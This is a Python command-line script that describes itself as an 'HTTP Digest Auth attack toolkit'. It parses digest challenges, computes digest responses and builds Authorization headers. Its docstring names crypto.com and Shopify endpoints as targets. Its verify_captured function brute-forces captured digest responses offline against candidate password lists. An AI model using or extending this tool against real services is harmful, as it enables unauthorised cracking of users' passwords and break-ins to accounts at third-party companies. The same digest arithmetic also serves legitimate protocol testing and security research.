#!/usr/bin/env python3
"""
rat_digest.py — HTTP Digest Auth attack toolkit
Adapted from Pepelux/sippts digest parsing (GPL, Jose Luis Verdeguer) for HTTP endpoints.
Usage: test digest challenge parsing + hash computation + response verification.
Targets: any crypto.com/shopify endpoint that returns 401 + WWW-Authenticate: Digest.
"""
import hashlib
import re
import sys
import argparse


_ALGORITHM_STRENGTH = [
    "MD5", "MD5-SESS", "SHA-256", "SHA-256-SESS",
    "SHA-512-256", "SHA-512-256-SESS", "SHA-512",
]


def normalize_algorithm(alg):
    return str(alg).strip().upper().replace("_", "-")


def algorithm_supported(alg):
    return normalize_algorithm(alg) in [a.upper() for a in _ALGORITHM_STRENGTH]


def get_hash(algorithm, data):
    algo = normalize_algorithm(algorithm)
    if algo.startswith("SHA-256"):
        return hashlib.sha256(data.encode()).hexdigest()
    if algo.startswith("SHA-512-256"):
        return hashlib.sha512(data.encode()).hexdigest()[:64]
    if algo.startswith("SHA-512"):
        return hashlib.sha512(data.encode()).hexdigest()
    return hashlib.md5(data.encode()).hexdigest()


def parse_digest_challenge(header):
    """Parse one WWW-Authenticate/Authorization digest header into fields."""
    data = {
        "username": "", "realm": "", "nonce": "", "uri": "",
        "response": "", "algorithm": "MD5", "cnonce": "", "nc": "", "qop": "",
        "opaque": "", "stale": "", "domain": "",
    }
    quoted = {
        "username": r'username="([^"]*)"',
        "realm": r'realm="([^"]*)"',
        "nonce": r'(?<!c)nonce="([^"]*)"',
        "uri": r'uri="([^"]*)"',
        "response": r'response="([^"]*)"',
        "cnonce": r'cnonce="([^"]*)"',
        "opaque": r'opaque="([^"]*)"',
        "domain": r'domain="([^"]*)"',
    }
    visto = False
    for field, regex in quoted.items():
        m = re.search(regex, header)
        if m:
            data[field] = m.group(1)
            visto = True
    m = re.search(r'algorithm="*([\w\-]+)"*', header)
    if m:
        data["algorithm"] = m.group(1)
        visto = True
    m = re.search(r'\bnc="*([\w\+]+)"*', header)
    if m:
        data["nc"] = m.group(1)
        visto = True
    m = re.search(r'\bqop="*([\w\+]+)"*', header)
    if m:
        data["qop"] = m.group(1)
        visto = True
    m = re.search(r'\bstale="*([\w\+]+)"*', header, re.IGNORECASE)
    if m:
        data["stale"] = m.group(1)
        visto = True
    return data if visto else None


def parse_digest_challenges(buffer):
    """All digest challenges in a response, one per header line."""
    out = []
    for header in buffer.split("\r\n"):
        d = parse_digest_challenge(header)
        if d:
            out.append(d)
    return out


def select_challenge(challenges, preferred=""):
    if not challenges:
        return None
    if preferred:
        want = normalize_algorithm(preferred)
        for d in challenges:
            if normalize_algorithm(d["algorithm"]) == want:
                return d
        return None
    best, pos = None, len(_ALGORITHM_STRENGTH)
    for d in challenges:
        alg = normalize_algorithm(d["algorithm"])
        if not algorithm_supported(alg):
            continue
        try:
            p = _ALGORITHM_STRENGTH.index(alg)
        except ValueError:
            p = len(_ALGORITHM_STRENGTH)
        if best is None or p < pos:
            best, pos = d, p
    return best or challenges[0]


def calculate_hash(username, realm, pwd, method, uri, nonce, algorithm,
                   cnonce="", nc="", qop="", entitybody=""):
    """RFC 2617 / RFC 7616 digest response computation."""
    a1 = "%s:%s:%s" % (username, realm, pwd)
    a2 = "%s:%s" % (method, uri)
    ha1 = get_hash(algorithm, a1)
    if str(algorithm).strip().upper().endswith("-SESS"):
        a1 = "%s:%s:%s" % (ha1, nonce, cnonce)
        ha1 = get_hash(algorithm, a1)
    ha2 = get_hash(algorithm, a2)
    if qop in ("auth", "auth-int") and cnonce:
        if qop == "auth-int":
            a2 = "%s:%s:%s" % (method, uri, get_hash(algorithm, entitybody))
            ha2 = get_hash(algorithm, a2)
        b = "%s:%s:%s:%s:%s:%s" % (ha1, nonce, nc, cnonce, qop, ha2)
    else:
        b = "%s:%s:%s" % (ha1, nonce, ha2)
    return get_hash(algorithm, b)


def build_authorization(username, realm, pwd, method, uri, nonce,
                        algorithm="MD5", opaque="", cnonce="", nc="",
                        qop="", entitybody=""):
    resp = calculate_hash(username, realm, pwd, method, uri, nonce,
                          algorithm, cnonce, nc, qop, entitybody)
    parts = [
        f'username="{username}"',
        f'realm="{realm}"',
        f'nonce="{nonce}"',
        f'uri="{uri}"',
        f'response="{resp}"',
        f'algorithm={algorithm}',
    ]
    if qop:
        parts.append(f'qop={qop}')
        parts.append(f'nc={nc or "00000001"}')
        parts.append(f'cnonce="{cnonce or "0a4f113b"}"')
    if opaque:
        parts.append(f'opaque="{opaque}"')
    return "Digest " + ", ".join(parts)


def verify_captured(challenge_header, auth_header, method, pwd_candidates):
    """Given a captured challenge + Authorization header, try passwords offline."""
    ch = parse_digest_challenge(challenge_header)
    auth = parse_digest_challenge(auth_header)
    if not ch or not auth:
        return []
    hits = []
    for pwd in pwd_candidates:
        resp = calculate_hash(auth["username"], ch["realm"], pwd, method,
                              auth["uri"], ch["nonce"], ch["algorithm"],
                              auth["cnonce"], auth["nc"], auth["qop"])
        if resp == auth["response"]:
            hits.append(pwd)
    return hits


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="HTTP Digest Auth attack toolkit")
    sub = ap.add_subparsers(dest="cmd")
    p = sub.add_parser("parse", help="parse a WWW-Authenticate header")
    p.add_argument("header")
    p = sub.add_parser("hash", help="compute digest response")
    for a in ["username", "realm", "password", "method", "uri", "nonce"]:
        p.add_argument("--" + a, required=True)
    p.add_argument("--algorithm", default="MD5")
    p.add_argument("--cnonce", default="")
    p.add_argument("--nc", default="")
    p.add_argument("--qop", default="")
    args = ap.parse_args()
    if args.cmd == "parse":
        import json
        print(json.dumps(parse_digest_challenge(args.header), indent=2))
    elif args.cmd == "hash":
        print(calculate_hash(args.username, args.realm, args.password,
                             args.method, args.uri, args.nonce,
                             args.algorithm, args.cnonce, args.nc, args.qop))
